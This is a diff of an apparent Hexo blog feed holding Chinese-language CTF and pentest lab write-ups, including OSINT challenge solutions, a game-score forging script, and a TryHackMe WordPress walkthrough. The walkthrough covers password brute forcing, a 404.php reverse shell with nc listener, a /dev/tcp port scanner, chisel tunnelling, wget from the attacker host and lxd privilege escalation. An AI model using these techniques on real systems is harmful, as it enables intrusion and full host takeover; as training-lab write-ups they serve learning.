@@ -377,7 +377,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#101;&#114;&#114;&#101;&#x6e;&#99;&#x65;&#100;&#x65;&#115;&#x63;&#x61;&#114;&#116;&#x65;&#115;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#101;&#114;&#114;&#101;&#x6e;&#99;&#x65;&#100;&#x65;&#115;&#x63;&#x61;&#114;&#116;&#x65;&#115;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#114;&#114;&#101;&#x6e;&#99;&#101;&#100;&#x65;&#115;&#x63;&#x61;&#114;&#x74;&#x65;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#x65;&#114;&#114;&#101;&#x6e;&#99;&#101;&#100;&#x65;&#115;&#x63;&#x61;&#114;&#x74;&#x65;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -385,7 +385,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#x65;&#114;&#114;&#101;&#110;&#99;&#101;&#x64;&#x65;&#115;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#x74;&#x65;&#114;&#114;&#101;&#110;&#99;&#101;&#x64;&#x65;&#115;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#114;&#114;&#101;&#x6e;&#x63;&#x65;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#x74;&#101;&#x73;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;">&#116;&#x65;&#114;&#114;&#101;&#x6e;&#x63;&#x65;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#x74;&#101;&#x73;&#64;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -797,22 +797,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Simple Hexo Password Challenge</title>
-    <url>/2024/09/01/Simple-Hexo-Password-Challenge/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="bb0695db7618002642ec4bd1f674d195a18680c025f944375d0aa648a56d0c0c">1500fac4dedea95a5ccc576be33c11523561934388efbd0d41c787ed685a83f9ef45583e33ad638249305af61ae4d87691f79707180cdee4de0c7a2426d3e3e5ac1310fe183e18ef1068bbe487df039a07b0c4106323354c2c98e75c7593f9813d296b466b6a8e94cbadd425d2bc2f74371a637d2fa5bb07016a4d48d3b437bef7fa4410364011ee6bbe9e7a068c89f830e338bce326a30188608b124f5c69a5be4b4b3e0a1ce16620cf3a85a8fa2f54a1e4b98790156de85a17c0ae967972530019b0cdd9b162722b25573f1428c25f3cd50fdfbcfb5cf3939cac9b49d8f47135695204beba35d52ac7b5a9a6832b58c758fd1215414416cdb79533f10885206c69957942769259b3959bc8b5990cd3</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-  </entry>
-  <entry>
     <title>NCKUCTF Write Up</title>
     <url>/2023/09/23/NCKUCTF/</url>
     <content><![CDATA[<h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>This CTF for beginners just popped up on SCINT, and I’m so busy currently so I didn’t participate the CTF seriously.<br>But some problems are interesting and I still learned from them, down below are the write ups~  </p>
@@ -868,6 +852,22 @@
         <tag>ret2shellcode</tag>
         <tag>serialization</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Simple Hexo Password Challenge</title>
+    <url>/2024/09/01/Simple-Hexo-Password-Challenge/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="bb0695db7618002642ec4bd1f674d195a18680c025f944375d0aa648a56d0c0c">1500fac4dedea95a5ccc576be33c11523561934388efbd0d41c787ed685a83f9ef45583e33ad638249305af61ae4d87691f79707180cdee4de0c7a2426d3e3e5ac1310fe183e18ef1068bbe487df039a07b0c4106323354c2c98e75c7593f9813d296b466b6a8e94cbadd425d2bc2f74371a637d2fa5bb07016a4d48d3b437bef7fa4410364011ee6bbe9e7a068c89f830e338bce326a30188608b124f5c69a5be4b4b3e0a1ce16620cf3a85a8fa2f54a1e4b98790156de85a17c0ae967972530019b0cdd9b162722b25573f1428c25f3cd50fdfbcfb5cf3939cac9b49d8f47135695204beba35d52ac7b5a9a6832b58c758fd1215414416cdb79533f10885206c69957942769259b3959bc8b5990cd3</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
     <title>Bounty Hacker on TryHackMe</title>
@@ -2642,6 +2642,38 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox GamePwn 隨筆 4/20</title>
+    <url>/2024/04/20/htb-gamepwn-2024apr/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>最近打HTB，發現了GamePwn這個好玩的領域。<br>顧名思義，就是一些遊戲作弊的挑戰，然後打起來挺好玩的w<br>然後…<del>其實都是昨天打得</del><br>這邊丟兩個昨天打起來覺得有趣的題目w  </p>
+<p>有興趣玩game hacking的一定要看cheat engine<br><a href="https://www.cnblogs.com/LyShark/p/10799926.html">https://www.cnblogs.com/LyShark/p/10799926.html</a>  </p>
+<h2 id="Lightning-Fast"><a href="#Lightning-Fast" class="headerlink" title="Lightning Fast"></a>Lightning Fast</h2><p><a href="https://app.hackthebox.com/challenges/315">https://app.hackthebox.com/challenges/315</a>  </p>
+<p>進去之後要先輸入instance的ip和port</p>
+<p><img src="https://hackmd.io/_uploads/HyQZ8ClWA.png" alt="image">  </p>
+<p>隨便玩一局看看</p>
+<p><img src="https://hackmd.io/_uploads/H1FlI0lW0.png" alt="image"></p>
+<p>有稍微試過用cheat engine改血量，分數，但都找不到qwq<br>開wireshark錄封包：  </p>
+<p><img src="https://hackmd.io/_uploads/HkiOI0lWC.png" alt="image"></p>
+<p>Follow TCP Stream  </p>
+<p><img src="https://hackmd.io/_uploads/r13tURxW0.png" alt="image"></p>
+<p>ㄟ…不會可以自己送score出去吧?!<br>對!!!<br><strong>exp.py</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">headers=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;94.237.62.195:35003&#x27;</span>, <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;UnityPlayer/2021.1.12f1 (UnityWebRequest/1.0, libcurl/7.75.0-DEV)&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;identity&#x27;</span>, <span class="string">&#x27;X-Unity-Version&#x27;</span>:<span class="string">&#x27;2021.1.12f1&#x27;</span>&#125;</span><br><span class="line">url=<span class="string">&#x27;http://94.237.62.195:35003/Q4VWqp&#x27;</span></span><br><span class="line">data=&#123;<span class="string">&quot;score&quot;</span>: <span class="number">10000000</span>&#125;</span><br><span class="line">req.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<p>Get flag!!!  </p>
+<p><img src="https://hackmd.io/_uploads/B1NZwRgZ0.png" alt="image"></p>
+<p>註：  </p>
+<p><img src="https://hackmd.io/_uploads/HJs4d0l-A.png" alt="image"></p>
+<p>要去&#x2F;endpoints找setter url  </p>
+<h2 id="StayInTheBoxCorp"><a href="#StayInTheBoxCorp" class="headerlink" title="StayInTheBoxCorp"></a>StayInTheBoxCorp</h2><p><img src="https://hackmd.io/_uploads/SkS7FRgbA.png" alt="image"><br>沒什麼，就是一直用CE抓角色位置的值(?)<br>唯一的點是我抓到最後看到一堆很大的數跟一些小的，我推測小的代表位置所以我加了一個 bugger than -26的filter<br>最後全部改成19跳過那個桿子就好<br><img src="https://hackmd.io/_uploads/rJ3R9Cg-A.png" alt="image">  </p>
+<p>莫名成為第80個做出這台的，但感覺難度根本不是hard啊(<br><a href="https://www.hackthebox.com/achievement/challenge/1519847/579">https://www.hackthebox.com/achievement/challenge/1519847/579</a></p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>好懶但還有好多東西要寫RRR</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>HackTheBox</tag>
+        <tag>game hacking</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Gobox on HackTheBox</title>
     <url>/2025/01/02/htb-gobox/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Victim’s IP : 10.10.10.113<br>Attacker’s IP : 10.10.14.14  </p>
@@ -2763,38 +2795,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Windows</tag>
         <tag>HackTheBox</tag>
         <tag>DNSADMINS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox GamePwn 隨筆 4/20</title>
-    <url>/2024/04/20/htb-gamepwn-2024apr/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>最近打HTB，發現了GamePwn這個好玩的領域。<br>顧名思義，就是一些遊戲作弊的挑戰，然後打起來挺好玩的w<br>然後…<del>其實都是昨天打得</del><br>這邊丟兩個昨天打起來覺得有趣的題目w  </p>
-<p>有興趣玩game hacking的一定要看cheat engine<br><a href="https://www.cnblogs.com/LyShark/p/10799926.html">https://www.cnblogs.com/LyShark/p/10799926.html</a>  </p>
-<h2 id="Lightning-Fast"><a href="#Lightning-Fast" class="headerlink" title="Lightning Fast"></a>Lightning Fast</h2><p><a href="https://app.hackthebox.com/challenges/315">https://app.hackthebox.com/challenges/315</a>  </p>
-<p>進去之後要先輸入instance的ip和port</p>
-<p><img src="https://hackmd.io/_uploads/HyQZ8ClWA.png" alt="image">  </p>
-<p>隨便玩一局看看</p>
-<p><img src="https://hackmd.io/_uploads/H1FlI0lW0.png" alt="image"></p>
-<p>有稍微試過用cheat engine改血量，分數，但都找不到qwq<br>開wireshark錄封包：  </p>
-<p><img src="https://hackmd.io/_uploads/HkiOI0lWC.png" alt="image"></p>
-<p>Follow TCP Stream  </p>
-<p><img src="https://hackmd.io/_uploads/r13tURxW0.png" alt="image"></p>
-<p>ㄟ…不會可以自己送score出去吧?!<br>對!!!<br><strong>exp.py</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">headers=&#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;94.237.62.195:35003&#x27;</span>, <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;UnityPlayer/2021.1.12f1 (UnityWebRequest/1.0, libcurl/7.75.0-DEV)&#x27;</span>, <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;identity&#x27;</span>, <span class="string">&#x27;X-Unity-Version&#x27;</span>:<span class="string">&#x27;2021.1.12f1&#x27;</span>&#125;</span><br><span class="line">url=<span class="string">&#x27;http://94.237.62.195:35003/Q4VWqp&#x27;</span></span><br><span class="line">data=&#123;<span class="string">&quot;score&quot;</span>: <span class="number">10000000</span>&#125;</span><br><span class="line">req.post(url, json=data)</span><br></pre></td></tr></table></figure>
-
-<p>Get flag!!!  </p>
-<p><img src="https://hackmd.io/_uploads/B1NZwRgZ0.png" alt="image"></p>
-<p>註：  </p>
-<p><img src="https://hackmd.io/_uploads/HJs4d0l-A.png" alt="image"></p>
-<p>要去&#x2F;endpoints找setter url  </p>
-<h2 id="StayInTheBoxCorp"><a href="#StayInTheBoxCorp" class="headerlink" title="StayInTheBoxCorp"></a>StayInTheBoxCorp</h2><p><img src="https://hackmd.io/_uploads/SkS7FRgbA.png" alt="image"><br>沒什麼，就是一直用CE抓角色位置的值(?)<br>唯一的點是我抓到最後看到一堆很大的數跟一些小的，我推測小的代表位置所以我加了一個 bugger than -26的filter<br>最後全部改成19跳過那個桿子就好<br><img src="https://hackmd.io/_uploads/rJ3R9Cg-A.png" alt="image">  </p>
-<p>莫名成為第80個做出這台的，但感覺難度根本不是hard啊(<br><a href="https://www.hackthebox.com/achievement/challenge/1519847/579">https://www.hackthebox.com/achievement/challenge/1519847/579</a></p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>好懶但還有好多東西要寫RRR</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>HackTheBox</tag>
-        <tag>game hacking</tag>
       </tags>
   </entry>
   <entry>
@@ -4944,53 +4944,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>For Business Reasons on Tryhackme</title>
-    <url>/2024/06/02/thm-for-business-reasons/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>今天寫的詳細點，當作替攻防演練練習(?)<br>Victim’s IP : 10.10.130.147<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p>使用 rustscan 進行端口掃描  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.130.147 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/H1xnVat4C.png" alt="image">  </p>
-<p>只有一個 80 port，進去是 wordpress</p>
-<h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>利用wpscan對網站進行掃描與用戶枚舉  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -e u</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyrGr6K4A.png" alt="image">  </p>
-<p>上網查一下可以知道這個版本仍然能登入後RCE。  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="password-enumeration"><a href="#password-enumeration" class="headerlink" title="password enumeration"></a>password enumeration</h4><p>再次利用wpscan搭配rockyou.txt結合前面獲得的使用者名稱(<code>sysadmin</code>)進行帳號密碼爆破  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -P /home/wha13/wordlists/rockyou.txt -U sysadmin</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rytvHpKER.png" alt="image">  </p>
-<p>成功取得帳號密碼，到<code>http://10.10.130.147/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyseventeen</code>編輯404.php改成reverse shell(彈到 port 9001)<br>本地開啟9001端口  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 9001</span><br></pre></td></tr></table></figure>
-<p>最後造訪<code>http://10.10.130.147/wp-content/themes/twentyseventeen/404.php</code>就拿到shellㄌ  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h4><p>透過本地http server打routingtableparser進去(rtp)看有哪些網路介面<br><a href="https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0">link : https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0</a><br>看到這個有趣的eth2，port scan下去<br><img src="https://hackmd.io/_uploads/rJudI6FNC.png" alt="image">  </p>
-<p><strong>portscan.sh</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the script is provided with exactly one argument</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;IP&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">IP=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span> (<span class="built_in">echo</span> Hello &gt; /dev/tcp/<span class="variable">$IP</span>/<span class="variable">$port</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Port <span class="variable">$port</span> is OPEN&quot;</span>) 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<p>啟動它：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./portscan.sh 172.18.0.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/By4xv6KN0.png" alt="image">  </p>
-<p>發現port 22，利用chisel<a href="https://github.com/jpillora/chisel">(link here)</a>把ssh串出來：  </p>
-<p>攻擊者端：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chisel server -p 8000 --reverse -v</span><br></pre></td></tr></table></figure>
-<p>Victim端：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">./chisel client 10.9.195.189:8000 R:127.0.0.1::2222:172.18.0.1:22</span><br></pre></td></tr></table></figure>
-<p>最後ssh進去，密碼跟剛剛一樣：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh sysadmin@0.0.0.0 -p 2222</span><br></pre></td></tr></table></figure>
-<h4 id="lxd-exploit"><a href="#lxd-exploit" class="headerlink" title="lxd exploit"></a>lxd exploit</h4><p>Linpeas進去看到lxd權限有開<br><img src="https://hackmd.io/_uploads/BkBldptVC.png" alt="image"><br>開打 :D<br><a href="https://github.com/samoN1k0la/LXD-Privilege-Escalation">Reference : samoN1k0la@github</a><br>攻擊者端(需要root權限)：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJZnupKVR.png" alt="image"><br>開 http server  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7777</span><br></pre></td></tr></table></figure>
-<p><strong>Victim 端</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 10.9.195.189:7777/alpine-v3.20-x86_64-20240602_1718.tar.gz</span><br><span class="line">lxc image import alpine-v3.20-x86_64-20240602_1718.tar.gz --<span class="built_in">alias</span> thesysrat</span><br><span class="line">lxc image list</span><br><span class="line">lxc init thesysrat ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>
-<p>整個機器就被送進去 <code>/mnt/root</code> 的路徑咯~<br><img src="https://hackmd.io/_uploads/H1wzYpYNC.png" alt="image"><br>hehe  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>好欸又一台 Hard，練了很多技巧<br>不過建議某人不要耍白目了👊  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>lxd</tag>
-        <tag>routingtableparser</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Fusion Corp Write Up on TryHackMe</title>
     <url>/2024/07/13/thm-fusioncorp/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Attacker’s IP : 10.9.195.189<br>Victim’s IP : 10.10.180.227<br>Victim’s IP : fusion.corp  </p>
@@ -5045,6 +4998,53 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
         <tag>TryHackMe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>For Business Reasons on Tryhackme</title>
+    <url>/2024/06/02/thm-for-business-reasons/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>今天寫的詳細點，當作替攻防演練練習(?)<br>Victim’s IP : 10.10.130.147<br>Attacker’s IP : 10.9.195.189  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p>使用 rustscan 進行端口掃描  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.130.147 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -PN</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/H1xnVat4C.png" alt="image">  </p>
+<p>只有一個 80 port，進去是 wordpress</p>
+<h4 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h4><p>利用wpscan對網站進行掃描與用戶枚舉  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -e u</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyrGr6K4A.png" alt="image">  </p>
+<p>上網查一下可以知道這個版本仍然能登入後RCE。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="password-enumeration"><a href="#password-enumeration" class="headerlink" title="password enumeration"></a>password enumeration</h4><p>再次利用wpscan搭配rockyou.txt結合前面獲得的使用者名稱(<code>sysadmin</code>)進行帳號密碼爆破  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://10.10.130.147/ -P /home/wha13/wordlists/rockyou.txt -U sysadmin</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rytvHpKER.png" alt="image">  </p>
+<p>成功取得帳號密碼，到<code>http://10.10.130.147/wp-admin/theme-editor.php?file=404.php&amp;theme=twentyseventeen</code>編輯404.php改成reverse shell(彈到 port 9001)<br>本地開啟9001端口  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 9001</span><br></pre></td></tr></table></figure>
+<p>最後造訪<code>http://10.10.130.147/wp-content/themes/twentyseventeen/404.php</code>就拿到shellㄌ  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h4><p>透過本地http server打routingtableparser進去(rtp)看有哪些網路介面<br><a href="https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0">link : https://gist.github.com/incebellipipo/6c8657fe1c898ff64a42cddfa6dea6e0</a><br>看到這個有趣的eth2，port scan下去<br><img src="https://hackmd.io/_uploads/rJudI6FNC.png" alt="image">  </p>
+<p><strong>portscan.sh</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the script is provided with exactly one argument</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;IP&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">IP=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> &#123;1..65535&#125;; <span class="keyword">do</span> (<span class="built_in">echo</span> Hello &gt; /dev/tcp/<span class="variable">$IP</span>/<span class="variable">$port</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Port <span class="variable">$port</span> is OPEN&quot;</span>) 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>啟動它：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./portscan.sh 172.18.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/By4xv6KN0.png" alt="image">  </p>
+<p>發現port 22，利用chisel<a href="https://github.com/jpillora/chisel">(link here)</a>把ssh串出來：  </p>
+<p>攻擊者端：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chisel server -p 8000 --reverse -v</span><br></pre></td></tr></table></figure>
+<p>Victim端：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">./chisel client 10.9.195.189:8000 R:127.0.0.1::2222:172.18.0.1:22</span><br></pre></td></tr></table></figure>
+<p>最後ssh進去，密碼跟剛剛一樣：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh sysadmin@0.0.0.0 -p 2222</span><br></pre></td></tr></table></figure>
